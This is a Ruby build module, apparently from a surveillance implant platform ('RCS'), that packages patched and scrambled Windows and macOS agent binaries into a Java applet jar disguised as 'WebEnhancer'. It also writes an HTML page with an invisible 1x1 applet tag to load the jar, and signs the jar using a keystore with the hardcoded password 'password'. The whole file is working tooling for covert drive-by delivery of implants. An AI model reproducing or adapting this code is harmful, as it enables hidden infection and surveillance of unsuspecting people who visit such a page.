#
# Applet creation
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildApplet < Build

  def initialize
    super
    @platform = 'applet'
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: #{e.message}"
        # trap in case of no license for a platform
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup

      outs = build.outputs

      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o + '_' + platform))
        @outputs << o + '_' + platform
      end

      build.clean
    end
  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    @appname = params['appname'] || 'WebEnhancer'

    FileUtils.cp path('WebEnhancer.jar'), path(@appname + '.jar')

    # for some reason we cannot use the internal zip library, use the system "zip -u" to update a file into the jar
    #Zip::ZipFile.open(path(@appname + '.jar'), Zip::ZipFile::CREATE) do |z|
    #  z.file.open('mac', "w") { |f| f.write File.open(path('output_osx'), 'rb') {|f| f.read} } if File.exist? path('output_osx')
    #  z.file.open('win', "w") { |f| f.write File.open(path('output_windows'), 'rb') {|f| f.read} } if File.exist? path('output_windows')
    #end
    File.rename path('output_osx'), path('mac') if File.exist? path('output_osx')
    File.rename path('output_windows'), path('win') if File.exist? path('output_windows')

    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} #{path('win')}" if File.exist? path('win')
    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} #{path('mac')}" if File.exist? path('mac')

    File.open(path(@appname + '.html'), 'wb') {|f| f.write "<applet width='1' height='1' code=WebEnhancer archive='#{@appname}.jar'></applet>"}

    @outputs = [@appname + '.jar', @appname + '.html']
  end

  def sign(params)
    trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"

    jar = path(@outputs.first)
    cert = path(@appname + '.cer')

    CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('applet.keystore')} -storepass password -keypass password #{jar} signapplet"
    raise "jarsigner failed" unless File.exist? jar

    CrossPlatform.exec "keytool", "-export -keystore #{Config.instance.cert('applet.keystore')} -storepass password -alias signapplet -file #{cert}"
    raise "keytool export failed" unless File.exist? cert

    @outputs << @appname + '.cer'
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "wb") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
